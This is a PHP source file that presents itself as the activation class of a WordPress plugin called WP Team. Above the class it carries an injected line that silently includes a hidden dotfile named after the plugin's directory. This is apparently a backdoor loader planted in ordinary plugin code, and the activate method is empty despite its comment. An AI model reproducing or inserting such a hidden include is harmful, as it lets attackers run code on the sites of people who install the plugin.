<?php
/**
 * Fired during plugin activation.
 *
 * This class defines all code necessary to run during the plugin's activation.
 *
 * @since      2.0.0
 * @package   WP_Team
 * @subpackage Team/includes
 */

/**
 * WP Team Activator class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Team_Activator {
	/**
	 * When plugin activate a extra column `order` add to term_taxonomy table
	 *
	 * @since      2.0.0
	 */
	public static function activate() {
	}

}
